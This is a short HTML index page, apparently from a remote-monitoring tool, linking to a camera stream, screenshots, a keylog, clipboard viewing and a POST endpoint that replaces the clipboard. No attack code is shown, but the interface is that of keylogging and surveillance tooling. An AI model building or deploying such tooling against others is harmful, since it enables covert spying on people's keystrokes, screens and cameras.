    <h1>Camera Stream</h1>
    <p>Go to <a href="/camera">/camera</a> to see the camera stream.</p>
    <p>Go to <a href="/screenshot">/screenshot</a> to take a screenshot.</p>
    <p>Go to <a href="/keylog">/keylog</a> to view the keylog.</p>
    <p>Go to <a href="/clipboard-view">/clipboard-view</a> to view the current clipboard content.</p>
    <p>To update the clipboard content, send a POST request to <code>/clipboard-send</code> with the new content in the body.</p>
